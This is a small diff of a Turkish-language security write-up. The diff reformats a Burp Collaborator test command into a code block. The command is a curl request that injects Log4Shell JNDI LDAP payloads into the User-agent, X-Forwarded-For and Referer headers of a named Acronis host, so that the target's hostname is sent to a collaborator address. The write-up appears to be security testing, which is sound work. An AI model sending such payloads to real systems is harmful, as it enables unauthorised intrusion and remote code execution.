@@ -106,12 +106,12 @@ Bu açığı test etmek için bir yöntem buldum. Bu yöntemde Burp Collaborator
 
 İlk olarak, bu aracı kullanarak bir komut oluşturdum. Bu komut, belirli bir internet adresine (COLLABORATOR_URL) bir istek gönderiyor. Komutu şu şekilde yazdım:
 
-bash
-Kodu kopyala
+```bash
 curl --http1.1 --silent --output /dev/null \
 --header 'User-agent: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
 --header 'X-Forwarded-For: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
 --header 'Referer: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
+```
 https://ng01-cloud.acronis.com
 Bu Komut Ne Yapar?
 
